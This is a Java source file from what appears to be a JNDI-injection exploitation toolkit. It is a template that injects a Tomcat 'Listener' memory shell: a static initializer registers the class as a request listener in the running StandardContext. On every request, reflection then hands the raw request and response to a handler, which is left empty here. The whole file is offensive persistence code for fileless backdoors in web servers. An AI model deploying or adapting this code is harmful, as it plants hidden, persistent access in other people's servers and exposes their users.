package com.nu1r.jndi.template.tomcat;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;

/**
 * 使用 线程类 注入 Tomcat Listener 型内存马
 */
public class TLMSFromThreadLi implements ServletRequestListener {

    static {
        try {
            // 获取 standardContext
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();

            TLMSFromThreadLi listener = new TLMSFromThreadLi();
            standardContext.addApplicationEventListener(listener);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            Field         field         = requestFacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request  request  = (Request) field.get(requestFacade);
            Response response = request.getResponse();
            requestInitializedHandle(request, response);
        } catch (Exception ignore) {
        }
    }

    public void requestInitializedHandle(HttpServletRequest request, HttpServletResponse response) {
    }
}
